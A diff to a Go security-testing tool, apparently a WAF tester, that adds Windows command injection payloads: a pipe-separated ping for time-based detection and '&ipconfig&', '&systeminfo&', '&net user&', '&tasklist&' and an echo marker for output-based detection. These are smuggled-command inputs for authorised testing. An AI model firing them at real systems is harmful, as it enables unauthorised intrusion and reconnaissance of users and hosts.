@@ -238,6 +238,9 @@ func (t *Tester) windowsTimePayloads() []*Payload {
 		{Name: "Windows Ping OR", Type: InjectionTimeBased, Platform: PlatformWindows,
 			Value: fmt.Sprintf("||ping -n %d 127.0.0.1||", delay+1), ExpectedDelay: t.config.TimeThreshold,
 			Description: "Windows OR operator ping"},
+		{Name: "Windows Pipe Ping", Type: InjectionTimeBased, Platform: PlatformWindows,
+			Value: fmt.Sprintf("|ping -n %d 127.0.0.1", delay+1), ExpectedDelay: t.config.TimeThreshold,
+			Description: "Windows pipe separator ping"},
 	}
 }
 
@@ -260,6 +263,21 @@ func (t *Tester) windowsOutputPayloads() []*Payload {
 		{Name: "Windows set", Type: InjectionOutputBased, Platform: PlatformWindows,
 			Value: "&set&", Indicators: []string{"PATH=", "COMSPEC=", "SystemRoot="},
 			Description: "Windows environment variables"},
+		{Name: "Windows ipconfig", Type: InjectionOutputBased, Platform: PlatformWindows,
+			Value: "&ipconfig&", Indicators: []string{"IPv4", "Subnet Mask", "Default Gateway"},
+			Description: "Windows network configuration"},
+		{Name: "Windows systeminfo", Type: InjectionOutputBased, Platform: PlatformWindows,
+			Value: "&systeminfo&", Indicators: []string{"OS Name", "OS Version", "System Type"},
+			Description: "Windows system information"},
+		{Name: "Windows net user", Type: InjectionOutputBased, Platform: PlatformWindows,
+			Value: "&net user&", Indicators: []string{"Administrator", "Guest"},
+			Description: "Windows user listing"},
+		{Name: "Windows echo pipe", Type: InjectionOutputBased, Platform: PlatformWindows,
+			Value: "|echo waftester_cmdi|", Indicators: []string{"waftester_cmdi"},
+			Description: "Windows pipe separator echo"},
+		{Name: "Windows tasklist", Type: InjectionOutputBased, Platform: PlatformWindows,
+			Value: "&tasklist&", Indicators: []string{"PID", "Session", "Mem Usage"},
+			Description: "Windows process listing"},
 	}
 }
 
